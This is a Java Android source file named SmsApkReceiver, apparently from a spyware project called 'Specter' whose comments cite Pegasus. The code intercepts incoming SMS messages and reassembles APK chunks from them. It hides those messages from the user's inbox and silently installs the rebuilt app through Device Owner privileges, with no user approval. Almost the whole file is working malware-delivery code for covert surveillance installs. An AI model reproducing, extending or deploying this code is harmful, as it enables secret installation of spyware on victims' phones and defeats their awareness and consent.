package com.divine.specter.child.delivery;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.util.HashMap;
import java.util.Map;

/**
 * SMS APK Receiver - Receives and reassembles APK chunks from SMS
 *
 * Based on Pegasus research showing SMS-based APK delivery.
 *
 * Features:
 * - Receives chunked SMS messages
 * - Reassembles APK from chunks
 * - Auto-installs via Device Owner API
 * - Hides SMS from user inbox
 * - Multi-sender support
 *
 * @author Specter Development Team
 * @version 1.0
 */
public class SmsApkReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsApkReceiver";

    // SMS receive action
    private static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";

    // Chunk collections per sender (phone number)
    private static Map<String, SmsChunker.ChunkCollection> chunkCollections = new HashMap<>();

    // Installation callback action
    private static final String ACTION_INSTALL_COMPLETE = "com.specter.INSTALL_COMPLETE";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            return;
        }

        Log.d(TAG, "SMS received");

        Bundle bundle = intent.getExtras();
        if (bundle == null) {
            return;
        }

        // Extract SMS messages
        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null || pdus.length == 0) {
            return;
        }

        String format = bundle.getString("format");

        for (Object pdu : pdus) {
            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu, format);
            if (smsMessage == null) {
                continue;
            }

            String sender = smsMessage.getOriginatingAddress();
            String body = smsMessage.getMessageBody();

            if (body == null) {
                continue;
            }

            // Check if this is a chunk message
            if (body.startsWith(SmsChunker.PROTOCOL_PREFIX)) {
                Log.d(TAG, "Received APK chunk from " + sender);

                // Process chunk
                boolean shouldAbort = processChunk(context, sender, body);

                if (shouldAbort) {
                    // Hide SMS from user inbox
                    Log.d(TAG, "Aborting broadcast to hide SMS");
                    abortBroadcast();
                }
            }
        }
    }

    /**
     * Process received chunk
     *
     * @param context Application context
     * @param sender Phone number of sender
     * @param message SMS message body
     * @return true if broadcast should be aborted (SMS hidden)
     */
    private boolean processChunk(Context context, String sender, String message) {
        try {
            // Parse chunk
            SmsChunker.ChunkInfo chunk = SmsChunker.parseChunk(message);
            if (chunk == null) {
                Log.w(TAG, "Failed to parse chunk");
                return false;
            }

            Log.d(TAG, "Parsed chunk: " + chunk.toString());

            // Get or create chunk collection for this sender
            SmsChunker.ChunkCollection collection;
            synchronized (chunkCollections) {
                if (!chunkCollections.containsKey(sender)) {
                    Log.i(TAG, "Starting new chunk collection from " + sender +
                        " (expecting " + chunk.totalChunks + " chunks)");
                    collection = SmsChunker.createCollection(chunk.totalChunks);
                    chunkCollections.put(sender, collection);
                } else {
                    collection = chunkCollections.get(sender);
                }
            }

            // Decode chunk data
            byte[] chunkData = SmsChunker.decodeChunk(chunk);
            if (chunkData == null) {
                Log.e(TAG, "Failed to decode chunk data");
                return true;  // Hide malformed chunk
            }

            // Add chunk to collection
            boolean isNew = collection.addChunk(chunk.chunkNumber, chunkData);

            if (!isNew) {
                Log.d(TAG, "Duplicate chunk, ignoring");
                return true;  // Hide duplicate
            }

            // Check if complete
            if (collection.isComplete()) {
                Log.i(TAG, "All chunks received! Reassembling APK...");

                // Reassemble and install
                reassembleAndInstall(context, sender, collection);

                // Clean up
                synchronized (chunkCollections) {
                    chunkCollections.remove(sender);
                }
            } else {
                Log.d(TAG, String.format("Progress: %.1f%% (%d missing)",
                    collection.getProgress(),
                    collection.getMissingChunks().size()));
            }

            // Always hide chunk SMS
            return true;

        } catch (Exception e) {
            Log.e(TAG, "Error processing chunk", e);
            return true;  // Hide error-causing SMS
        }
    }

    /**
     * Reassemble chunks and install APK
     *
     * @param context Application context
     * @param sender Sender phone number
     * @param collection Complete chunk collection
     */
    private void reassembleAndInstall(Context context, String sender,
                                      SmsChunker.ChunkCollection collection) {
        try {
            // Reassemble
            byte[] apkBytes = collection.reassemble();
            Log.i(TAG, "APK reassembled: " + apkBytes.length + " bytes");

            // Validate APK structure
            if (!SmsChunker.isValidApk(apkBytes)) {
                Log.e(TAG, "Invalid APK file structure!");
                return;
            }

            // Calculate checksum for logging
            long checksum = SmsChunker.calculateChecksum(apkBytes);
            Log.i(TAG, "APK checksum: " + checksum);

            // Save to temp file
            File tempApk = new File(context.getFilesDir(), "received_" +
                System.currentTimeMillis() + ".apk");
            SmsChunker.saveApk(apkBytes, tempApk);

            Log.i(TAG, "APK saved to: " + tempApk.getPath());

            // Install APK
            installApk(context, tempApk);

        } catch (Exception e) {
            Log.e(TAG, "Failed to reassemble or install APK", e);
        }
    }

    /**
     * Install APK using Device Owner PackageInstaller API
     *
     * @param context Application context
     * @param apkFile APK file to install
     */
    private void installApk(Context context, File apkFile) {
        try {
            Log.i(TAG, "Installing APK: " + apkFile.getName());

            PackageInstaller installer = context.getPackageManager().getPackageInstaller();

            // Create install session
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            );

            // Silent install (Device Owner privilege)
            params.setAppPackageName(context.getPackageName());

            int sessionId = installer.createSession(params);
            PackageInstaller.Session session = installer.openSession(sessionId);

            // Write APK to session
            OutputStream out = session.openWrite("specter_child", 0, -1);
            FileInputStream fis = new FileInputStream(apkFile);

            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                out.write(buffer, 0, bytesRead);
            }

            session.fsync(out);
            out.close();
            fis.close();

            // Create completion callback
            Intent intent = new Intent(ACTION_INSTALL_COMPLETE);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                context, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
            );

            // Commit session (triggers install)
            session.commit(pendingIntent.getIntentSender());
            session.close();

            Log.i(TAG, "Installation session committed");

            // Note: Actual installation happens asynchronously
            // Device Owner should auto-approve without user interaction

        } catch (Exception e) {
            Log.e(TAG, "Failed to install APK", e);
        }
    }

    /**
     * Get current chunk collections (for debugging)
     */
    public static Map<String, SmsChunker.ChunkCollection> getChunkCollections() {
        return chunkCollections;
    }

    /**
     * Clear all chunk collections (for testing)
     */
    public static void clearCollections() {
        synchronized (chunkCollections) {
            chunkCollections.clear();
        }
    }

    /**
     * Get progress for specific sender
     */
    public static float getProgress(String sender) {
        synchronized (chunkCollections) {
            SmsChunker.ChunkCollection collection = chunkCollections.get(sender);
            return collection != null ? collection.getProgress() : 0;
        }
    }

    /**
     * Get or create chunk collection for sender (for testing)
     */
    static SmsChunker.ChunkCollection getCollection(String sender, int totalChunks) {
        synchronized (chunkCollections) {
            if (!chunkCollections.containsKey(sender)) {
                SmsChunker.ChunkCollection collection = SmsChunker.createCollection(totalChunks);
                chunkCollections.put(sender, collection);
                return collection;
            }
            return chunkCollections.get(sender);
        }
    }

    /**
     * Remove chunk collection for sender (for testing)
     */
    static void removeCollection(String sender) {
        synchronized (chunkCollections) {
            chunkCollections.remove(sender);
        }
    }

    /**
     * Installation completion receiver
     */
    public static class InstallCompleteReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (!ACTION_INSTALL_COMPLETE.equals(intent.getAction())) {
                return;
            }

            int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1);
            String packageName = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME);

            if (status == PackageInstaller.STATUS_SUCCESS) {
                Log.i(TAG, "Installation successful: " + packageName);

                // Optional: Launch installed app
                // Intent launch = context.getPackageManager()
                //     .getLaunchIntentForPackage(packageName);
                // if (launch != null) {
                //     context.startActivity(launch);
                // }

            } else {
                String message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
                Log.e(TAG, "Installation failed: " + message + " (status: " + status + ")");
            }
        }
    }
}
